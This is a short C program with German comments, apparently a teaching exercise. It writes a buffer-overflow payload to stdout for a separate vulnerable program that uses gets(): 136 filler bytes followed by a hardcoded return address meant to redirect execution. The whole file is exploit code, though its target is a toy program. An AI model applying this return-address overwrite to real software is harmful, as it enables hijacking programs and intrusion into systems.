// Author: Marc Puttkammer	
// Compiler: gcc 	
// Angreifbare gets() Funktion 
//

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// 136 + 4/8 bytes = 128 byte buffer + 8 frame poiner + 4/8 byte return address
//
int main() {
  int i = 0;
  for( i = 0; i < 34; i++ )  // 34 
    printf( "1337" );        // x 4 = 136

  // neuer Return Instruction Pointer
  unsigned EIP = 0x00400605;      // zwei stellen sind ein byte ( alternativ: 0x0000000000400605 )
  fwrite( &EIP, 1, 4, stdout );   // und zu guter letzt den RIP als Overflow

  return 0;
}
